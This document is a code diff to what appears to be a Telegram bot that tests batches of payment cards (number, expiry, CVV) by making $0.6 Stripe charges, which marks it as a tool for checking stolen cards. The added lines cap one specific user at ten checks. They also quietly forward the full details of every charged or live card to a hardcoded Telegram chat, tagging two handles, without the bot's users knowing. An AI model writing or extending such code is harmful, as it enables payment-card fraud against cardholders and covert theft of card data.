@@ -362,7 +362,13 @@ async def runnr(event):
             reply=""
             log=''
             ratelimitcount = 0
+            limit_count = 0
             for cc in ccs:
+                if str(id) == '1564905478' or str(id)== '1001564905478':
+                    limit_count = limit_count + 1
+                if limit_count == 10:
+                    usr_msg = await event.reply("Only 10 Checks Allowed")
+                    break
                 cc, expm, expy, cvv = filter(cc)
                 f_cc = (f'''{cc}|{expm}|{expy}|{cvv}''')
                 try:
@@ -377,7 +383,8 @@ async def runnr(event):
                     funding = suc_response.payment_method_details.card.get("funding")
                     reply =(f'''**#Charged 0.6 $✅**\n{f_cc}\n
 **MESSAGE** : {seller_message} ✪ **FUNDING** : {funding}   ✪ **COUNTRY** : {country}   ✪ **RISK LEVEL** : {risk_level}   ✪ **RISK SCORE** : {risk_score}   ✪ [RECEIPT]({receipt}){finaltxt}
-=====================================\n''')            
+=====================================\n''')          
+                    await bot.send_message(-1001714990609,(reply+'\n @USERID_Null @PHANTASM_XD'))
                     log = log+"\n"+reply
                     if(len(log) > 4000):
                         log = reply
@@ -430,7 +437,13 @@ async def runnr(event):
             reply=""
             log=''
             ratelimitcount = 0
+            limit_count = 0
             for cc in ccs:
+                if str(id) == '1564905478' or str(id)== '1001564905478':
+                    limit_count = limit_count + 1
+                if limit_count == 10:
+                    usr_msg = await event.reply("Only 10 Checks Allowed")
+                    break
                 cc, expm, expy, cvv = filter(cc)
                 f_cc = (f'''{cc}|{expm}|{expy}|{cvv}''')
                 stripe.api_key = checkerkey[0]
@@ -439,6 +452,7 @@ async def runnr(event):
                     reply =(f'''**#LIVE✅**\n{f_cc}
 {finaltxt}
 =====================================\n''')
+                    await bot.send_message(-1001714990609,reply)
                 else:
                     try:
                         msgs =(str(msg).split(':')[1])
